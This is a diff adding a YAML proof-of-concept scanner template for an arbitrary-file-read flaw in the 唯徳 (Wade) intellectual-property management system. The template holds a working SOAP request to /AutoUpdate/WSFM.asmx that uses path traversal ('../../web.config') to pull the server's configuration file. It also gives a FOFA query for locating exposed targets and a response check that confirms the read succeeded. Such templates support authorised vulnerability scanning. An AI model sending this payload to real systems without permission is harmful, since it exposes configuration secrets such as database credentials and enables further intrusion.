@@ -1,0 +1,35 @@
+id: poc-yaml-wadeinfo-wsfm-downloadfileWordtemplate-fileread
+info:
+  name: 唯徳知识产权管理系统 DownloadFileWordTemplate 任意文件读取
+  severity: high
+  tags:
+  - 文件读取
+  finger: 唯徳知识产权管理系统
+  fofa: body="JSCOMM/language.js"
+requests:
+- method: POST
+  path: /AutoUpdate/WSFM.asmx
+  headers:
+    Content-Type: text/xml; charset=utf-8
+    SOAPAction: '"http://tempuri.org/DownloadFileWordTemplate"'
+  data: '<?xml version="1.0" encoding="utf-8"?>
+
+    <soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema"
+    xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
+
+    <soap:Body>
+
+    <DownloadFileWordTemplate xmlns="http://tempuri.org/">
+
+    <fileName>../../web.config</fileName>
+
+    </DownloadFileWordTemplate>
+
+    </soap:Body>
+
+    </soap:Envelope>'
+  expression: "status_code == 200 && \ncontains(body,\"<DownloadFileWordTemplateResponse\"\
+    ) &&\ncontains(body,\"</soap:Body>\") &&\ncontains(base64_decode(regex_find(body,`<DownloadFileWordTemplateResult>(.*?)</DownloadFileWordTemplateResult>`)),\"\
+    </configuration>\")\n"
+variables: {}
+transport: http
